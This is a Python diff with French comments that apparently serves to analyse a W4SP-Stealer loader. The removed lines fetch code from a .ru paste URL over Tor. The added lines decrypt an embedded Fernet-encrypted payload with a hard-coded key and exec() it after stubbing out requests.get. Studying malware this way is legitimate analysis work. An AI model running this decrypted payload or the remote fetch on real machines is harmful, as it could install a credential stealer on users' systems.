@@ -1,25 +1,30 @@
+import os
 import requests
+from fernet import Fernet
 
-url = 'https://totohateinenkleinencock.ru/paste?re…o=W4SP-Stealer'
+# --- 1) Déchiffre le code malveillant ---
+key   = b'0mKkGxyqdTZtwW24PAmNW-slDG-vSN-2n4gMoJlXZgU='
+cipher = Fernet(key)
+encrypted = b'gAAAAABoVFz7ZVmd0lAqMYurxDiRBbuEhel7KyzT8pZMoKKCNrjLi0zE5QyYzbBd8IzVHJ2UVftl6oXc51mkDKEIfH2V0zsby6C30ZpijuUWcBB0tRKZ36W_vOJhtmurbCp0ghIzDbX74oqcpBbwuzPZRv7wMMkm1_DKxLnIaGcQjeytaYOVp9PzO4aYuhm2rm0WmpXUFs8yscyucOFp8lcPkX4Xg8LowuDrUB_1tcdxVZpCNQr4zvo='
+payload_code = cipher.decrypt(encrypted).decode('utf-8')
 
-# 1) Définition de l’User‑Agent
-headers = {
-    'User-Agent': (
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
-        'AppleWebKit/537.36 (KHTML, like Gecko) '
-        'Chrome/115.0.0.0 Safari/537.36'
-    )
-}
+# --- 2) Monkey-patch requests.get ---
+orig_get = requests.get
+def intercept_get(url, *args, **kwargs):
+    print(f"[INTERCEPT] URL demandée : {url}")
+    # Option 1 : bloquer la demande et retourner un Dummy vide
+    class DummyResponse:
+        text = '# Requête bloquée : stub vide'
+    return DummyResponse()
 
-# 2) Si vous passez par Tor ou un proxy SOCKS5
-proxies = {
-    'http':  'socks5h://127.0.0.1:9050',
-    'https': 'socks5h://127.0.0.1:9050'
-}
+    # Option 2 : laisser passer la requête réelle, tout en la journalisant
+    # resp = orig_get(url, *args, **kwargs)
+    # print(f"[INTERCEPT] HTTP {resp.status_code} – longueur {len(resp.text)} octets")
+    # with open('remote_payload.py', 'w', encoding='utf-8') as f:
+    #     f.write(resp.text)
+    # return resp
 
-# 3) Exécution de la requête avec headers ET proxies
-r = requests.get(url, headers=headers, proxies=proxies)
+requests.get = intercept_get
 
-# 4) Nettoyage et affichage
-code = r.text.replace('<pre>', '').replace('</pre>', '')
-print(code)
+# --- 3) Exécute le code déchiffré (mais avec notre get intercepté) ---
+exec(payload_code)
